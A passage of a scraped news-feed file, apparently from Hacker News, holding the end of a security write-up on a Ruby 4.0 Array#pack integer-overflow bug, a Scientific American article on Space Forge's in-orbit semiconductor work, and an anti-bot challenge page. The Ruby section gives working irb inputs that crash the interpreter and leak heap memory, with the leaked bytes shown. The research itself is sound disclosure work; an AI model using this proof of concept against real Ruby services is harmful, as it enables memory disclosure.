    &lt;p&gt;irb(main):001&amp;gt; ["414243"].pack("H6X#{2**64}") (irb):1:in 'Array#pack': pack length too big (RangeError) from (irb):1:in '&amp;lt;main&amp;gt;' from /usr/local/lib/ruby/gems/4.0.0/gems/irb-1.16.0/exe/irb:9:in '&amp;lt;top (required)&amp;gt;' from /usr/local/lib/ruby/4.0.0/rubygems.rb:303:in 'Kernel#load' from /usr/local/lib/ruby/4.0.0/rubygems.rb:303:in 'Gem.activate_and_load_bin_path' from /usr/local/bin/irb:25:in '&amp;lt;main&amp;gt;' irb(main):002&amp;gt; ["414243"].pack("H6X#{2**64 - 1}") =&amp;gt; "ABC\x00" irb(main):003&amp;gt; ["414243"].pack("H6X#{2**64 - 2}") =&amp;gt; "ABC\x00\x00" [...] irb(main):012&amp;gt; ["414243"].pack("H6X#{2**64 - 11}") =&amp;gt; "ABC\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" irb(main):013&amp;gt; ["414243"].pack("H6X#{2**64 - 12}") =&amp;gt; "ABC\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" irb(main):014&amp;gt; ["414243"].pack("H6X#{2**64 - 13}") &amp;lt;internal:pack&amp;gt;:8: [BUG] probable buffer overflow: 16 for 15 ruby 4.0.0 (2025-12-25 revision 553f1675f3) +PRISM [x86_64-linux] -- Control frame information ----------------------------------------------- c:0022 p:0003 s:0123 e:000122 l:y b:0001 METHOD &amp;lt;internal:pack&amp;gt;:8 c:0021 p:0024 s:0116 e:000115 l:n b:---- EVAL (irb):14 [FINISH] c:0020 p:---- s:0113 e:000112 l:y b:---- CFUNC :eval [...] /usr/local/lib/libruby.so.4.0(rb_str_resize) /usr/src/ruby/string.c:3443 /usr/local/lib/libruby.so.4.0(pack_pack+0x9be) [0x7f6e215ca4be] /usr/src/ruby/pack.c:639 [...] &amp;lt;internal:pack&amp;gt;:8: [BUG] Aborted at 0x0000000000000001 ruby 4.0.0 (2025-12-25 revision 553f1675f3) +PRISM [x86_64-linux] Crashed while printing bug report&lt;/p&gt;
    &lt;p&gt;We cannot leak an arbitrary amount of memory due to the guard condition we encounter within rb_str_set_len inside ruby/string.c which looks as follows:&lt;/p&gt;
    &lt;p&gt;rb_str_set_len&lt;/p&gt;
    &lt;p&gt;void rb_str_set_len(VALUE str, long len) { [...] if (len &amp;gt; (capa = (long)str_capacity(str, termlen)) || len &amp;lt; 0) { rb_bug("probable buffer overflow: %ld for %ld", len, capa); }&lt;/p&gt;
    &lt;p&gt;By trying strings of different length, the capacity was found to be rounded to the next power of two. This means with control of the string inside the array that is being packed, we can select a string length equal to a power of two to leak the most while avoiding triggering the guard condition.&lt;/p&gt;
    &lt;p&gt;irb(main):001&amp;gt; ["A"*512].pack("a512X#{2**64-511}") =&amp;gt; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAA\x00\x0E\xD8D\x11\x7F\x00\x00`\x0E\xD8D\x11\x7F\x00\ x00\xD8\x9F\xC9D\x11\x7F\x00\x00p\x11\xCAD\x11\x7F\x00\x00p\x17\xC9D\x1 1\x7F\x00\x008\x18\xC9D\x11\x7F\x00\x00x\x0E\xBBD\x11\x7F\x00\x00(\x0E\ xBBD\x11\x7F\x00\x00\x80\xD3\xC5D\x11\x7F\x00\x00\xF8\xD3\xC5D\x11\x7F\ x00\x00\x98\xD4\xC5D\x11\x7F\x00\x00\xF8\xA1\xEDD\x11\x7F\x00\x00(\xA4\ xEDD\x11\x7F\x00\x00X\xB0\xEDD\x11\x7F\x00\x00\x98\xB1\xEDD\x11\x7F\x00 \x00P\xC7\xEDD\x11\x7F\x00\x00`\xB2\xEDD\x11\x7F\x00\x00\x80\x97\xEDD\x 11\x7F\x00\x00\x18\xC8\xEDD\x11\x7F\x00\x00\bX\x9BD\x11\x7F\x00\x00\b\x D5\xAAD\x11\x7F\x00\x00\xE8\xD6\xAAD\x11\x7F\x00\x00\x80\xD5\xAAD\x11\x 7F\x00\x00\x90\xD4\xAAD\x11\x7F\x00\x008\xD7\xAAD\x11\x7F\x00\x00\xD0\x BE\xE4D\x11\x7F\x00\x00\xD8\xCF\xE4D\x11\x7F\x00\x00\xC8\xD0\xE4D\x11\x 7F\x00\x000\xD2\xE4D\x11\x7F\x00\x00\b\xD2\xE4D\x11\x7F\x00\x00\b\xE6\x E4D\x11\x7F\x00\x00\x18\xD1\xE4D\x11\x7F\x00\x00\xE0\xD1\xE4D\x11\x7F\x 00\x00PN\xCBD\x11\x7F\x00\x00\x18O\xCBD\x11\x7F\x00\x00\xA0N\xCBD\x11\x 7F\x00\x00hO\xCBD\x11\x7F\x00\x00\xA0S\xCBD\x11\x7F\x00\x00\xB0R\xCBD\x 11\x7F\x00\x00xS\xCBD\x11\x7F\x00\x008R\xCBD\x11\x7F\x00\x00\x18T\xCBD\ x11\x7F\x00\x00\xD8\xE0\xECD\x11\x7F\x00\x00`\xCC\xECD\x11\x7F\x00\x00\ xB0\x00\xE6D\x11\x7F\x00\x00\x88r\xECD\x11\x7F\x00\x00\xF0\x16\xDBD\x11 \x7F\x00\x00P\x16\xDBD\x11\x7F\x00\x00\xC0\x96\xDBD\x11\x7F\x00\x00@\x9 4\xDBD\x11\x7F\x00\x00\xE0\xF3\xDBD\x11\x7F\x00\x00P\xF2\xDBD\x11\x7F\x 00\x00\xA8W\xECD\x11\x7F\x00\x00@W\xE6D\x11\x7F\x00\x00\xF0V\xE6D\x11\x 7F\x00\x00\xC8\xC8\xD8D\x11\x7F\x00\x000\xD9\xD8D\x11\x7F\x00\x00P\v\xE 6D\x11\x7F\x00\x00\xC8V\xE6D\x11\x7F\x00\x00\xA8\x03\xE6D\x11\x7F\x00\x 00\xE8J\xE6D\x11\x7F\x00\x00H\xCB\xD8D\x11\x7F\x00\x00X\xD9\xD8D\x11\x7 F\x00\x00\xD8^\xECD\x11\x7F\x00"&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://nastystereo.com/security/ruby-pack.html"/><published>2026-01-06T23:46:24+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46520754</id><title>Space Forge plans to manufacture semiconductors from space</title><updated>2026-01-07T00:55:11.287110+00:00</updated><content>&lt;doc fingerprint="9196f15f304f1d7b"&gt;
  &lt;main&gt;
    &lt;p&gt;Space Forge is on a mission to manufacture semiconductors in space‚Äîno humans required. And on Wednesday the U.K.-based aerospace startup announced that it had taken a major step toward that goal by creating plasma, or superheated gas, aboard a commercial satellite for the first time.&lt;/p&gt;
    &lt;p&gt;Semiconductors require extremely precise conditions to make, and both NASA and industry groups have argued that the microgravity environment of space is better for their manufacturing than that of Earth. The reasons why are varied, but part of it has to do with how silicon behaves in such an environment‚Äîit‚Äôs just easier to get the material to adhere to the structure needed to make a semiconductor.&lt;/p&gt;
    &lt;p&gt;Indeed, Space Forge‚Äôs feat builds off previous work done on the International Space Station, says Clayton Swope, deputy director of the Aerospace Security Project at the Center for Strategic and International Studies, a think tank.&lt;/p&gt;
    &lt;head rend="h2"&gt;On supporting science journalism&lt;/head&gt;
    &lt;p&gt;If you're enjoying this article, consider supporting our award-winning journalism by subscribing. By purchasing a subscription you are helping to ensure the future of impactful stories about the discoveries and ideas shaping our world today.&lt;/p&gt;
    &lt;p&gt;‚ÄúThe key difference here is that this was done uncrewed, without any people, on an entirely commercial spacecraft,‚Äù he says. ‚ÄúThis demonstration shows that semiconductor crystal manufacturing can happen in space just using machines.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúKeeping people alive in space is expensive,‚Äù Swope adds. ‚ÄúIf machines can do that work instead, it brings down the cost of doing manufacturing in space.‚Äù&lt;/p&gt;
    &lt;p&gt;Space Forge CEO Joshua Western said in a press release that the company‚Äôs work proves that the right environment for semiconductor manufacturing ‚Äúcan be achieved on a dedicated, commercial satellite‚Äîopening the door to a completely new manufacturing frontier.‚Äù Space Forge launched its satellite, ForgeStar-1, in June. Its microwave-sized factory includes a furnace that the company showed reached temperatures of around 1,832 degrees Fahrenheit (1,000 degrees Celsius).&lt;/p&gt;
    &lt;p&gt;Other companies and research teams are getting in on the budding space manufacturing industry. In 2024 another startup, Varda Space Industries, demonstrated that it was possible to grow crystals of ritonavir, an antiviral drug, on an uncrewed commercial spacecraft and return them to Earth. And researchers at the Swiss Federal Institute of Technology Zurich recently 3D-printed human tissues in microgravity.&lt;/p&gt;
    &lt;p&gt;In-space manufacturing is in its ‚Äúearly days,‚Äù Libby Jackson, head of space at the Science Museum in England, told the BBC. But testing and proving technology like Space Forge‚Äôs ‚Äúreally opens the door for an economically viable product, where things can be made in space and return to Earth and have use and benefit to everybody on Earth.‚Äù&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.scientificamerican.com/article/the-push-to-make-semiconductors-in-space-just-took-a-serious-leap-forward/"/><published>2026-01-07T00:06:34+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46520879</id><title>Why the trans flag emoji is the 5-codepoint sequence it is</title><updated>2026-01-07T00:55:10.984022+00:00</updated><content>&lt;doc fingerprint="5e8f767c1c2747ac"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Making sure you're not a bot!&lt;/head&gt;
    &lt;p&gt;Loading...&lt;/p&gt;
    &lt;p&gt;You are seeing this because the administrator of this website has set up Anubis to protect the server against the scourge of AI companies aggressively scraping websites. This can and does cause downtime for the websites, which makes their resources inaccessible for everyone.&lt;/p&gt;
    &lt;p&gt;Anubis is a compromise. Anubis uses a Proof-of-Work scheme in the vein of Hashcash, a proposed proof-of-work scheme for reducing email spam. The idea is that at individual scales the additional load is ignorable, but at mass scraper levels it adds up and makes scraping much more expensive.&lt;/p&gt;
    &lt;p&gt;Ultimately, this is a placeholder solution so that more time can be spent on fingerprinting and identifying headless browsers (EG: via how they do font rendering) so that the challenge proof of work page doesn't need to be presented to users that are much more likely to be legitimate.&lt;/p&gt;
    &lt;p&gt;Please note that Anubis requires the use of modern JavaScript features that plugins like JShelter will disable. Please disable JShelter or other such plugins for this domain.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://hecate.pink/blog/2026/trans-flag-emoji/"/><published>2026-01-07T00:22:06+00:00</published></entry></feed>